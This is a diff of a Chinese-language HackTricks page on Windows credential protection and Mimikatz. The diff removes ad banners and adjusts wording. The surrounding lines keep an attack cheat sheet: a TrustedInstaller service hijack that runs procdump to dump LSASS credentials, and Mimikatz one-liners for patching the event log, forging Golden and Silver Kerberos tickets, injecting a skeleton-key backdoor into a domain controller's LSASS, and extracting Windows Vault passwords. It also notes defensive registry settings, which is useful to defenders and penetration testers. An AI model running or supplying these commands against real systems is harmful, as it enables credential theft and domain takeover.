@@ -2,29 +2,23 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
+**本页面基于 [adsecurity.org](https://adsecurity.org/?page_id=1821) 的内容**。请查看原文以获取更多信息！
 
-通过8kSec Academy深化您在**移动安全**方面的专业知识。通过我们的自学课程掌握iOS和Android安全并获得认证：
+## 内存中的 LM 和明文
 
-{% embed url="https://academy.8ksec.io/" %}
+从 Windows 8.1 和 Windows Server 2012 R2 开始，实施了重要措施以防止凭据盗窃：
 
-**本页面基于[adsecurity.org](https://adsecurity.org/?page_id=1821)上的内容**。查看原文以获取更多信息！
+- **LM 哈希和明文密码**不再存储在内存中以增强安全性。必须将特定注册表设置 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ 配置为 DWORD 值 `0` 以禁用摘要身份验证，确保“明文”密码不会在 LSASS 中缓存。
 
-## 内存中的LM和明文
+- **LSA 保护**被引入以保护本地安全机构（LSA）进程免受未经授权的内存读取和代码注入。这是通过将 LSASS 标记为受保护进程来实现的。激活 LSA 保护涉及：
+1. 修改注册表 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_，将 `RunAsPPL` 设置为 `dword:00000001`。
+2. 实施一个强制此注册表更改的组策略对象（GPO），以在受管理设备上执行。
 
-从Windows 8.1和Windows Server 2012 R2开始，实施了重要措施以防止凭据盗窃：
+尽管有这些保护措施，像 Mimikatz 这样的工具仍然可以使用特定驱动程序绕过 LSA 保护，尽管此类操作可能会被记录在事件日志中。
 
-- **LM哈希和明文密码**不再存储在内存中以增强安全性。必须将特定注册表设置_HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_配置为DWORD值`0`以禁用摘要身份验证，确保“明文”密码不在LSASS中缓存。
+### 反制 SeDebugPrivilege 移除
 
-- **LSA保护**被引入以保护本地安全机构（LSA）进程免受未经授权的内存读取和代码注入。这是通过将LSASS标记为受保护进程来实现的。激活LSA保护涉及：
-1. 在_HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_中修改注册表，将`RunAsPPL`设置为`dword:00000001`。
-2. 实施一个强制此注册表更改的组策略对象（GPO），以便在受管理设备上生效。
-
-尽管有这些保护措施，像Mimikatz这样的工具仍然可以使用特定驱动程序绕过LSA保护，尽管此类行为可能会被记录在事件日志中。
-
-### 反制SeDebugPrivilege移除
-
-管理员通常拥有SeDebugPrivilege，使他们能够调试程序。可以限制此权限以防止未经授权的内存转储，这是攻击者提取内存中凭据的常用技术。然而，即使移除了此权限，TrustedInstaller帐户仍然可以使用自定义服务配置执行内存转储：
+管理员通常拥有 SeDebugPrivilege，使他们能够调试程序。可以限制此权限以防止未经授权的内存转储，这是攻击者提取内存中凭据的常用技术。然而，即使移除了此权限，TrustedInstaller 账户仍然可以使用自定义服务配置执行内存转储：
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
@@ -51,7 +45,7 @@ sc start TrustedInstaller
 - 示例：`mimikatz "privilege::debug" "event::drop" exit`
 
 - `privilege::debug` 命令确保 Mimikatz 以必要的权限操作，以修改系统服务。
-- 然后，`event::drop` 命令修补事件日志服务。
+- `event::drop` 命令随后修补事件日志服务。
 
 ### Kerberos 票证攻击
 
@@ -78,7 +72,7 @@ Silver Tickets 授予对特定服务的访问权限。关键命令和参数：
 
 - 命令：类似于 Golden Ticket，但针对特定服务。
 - 参数：
-- `/service`：要针对的服务（例如，cifs，http）。
+- `/service`: 目标服务（例如，cifs，http）。
 - 其他参数类似于 Golden Ticket。
 
 示例：
@@ -158,7 +152,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### 杂项
 
-- **MISC::Skeleton**：在 DC 的 LSASS 中注入后门。
+- **MISC::Skeleton**：在 DC 上向 LSASS 注入后门。
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### 权限提升
@@ -203,10 +197,5 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - 从 Windows Vault 中提取密码。
 - `mimikatz "vault::cred /patch" exit`
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-深入了解 **移动安全**，请访问 8kSec 学院。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：
-
-{% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
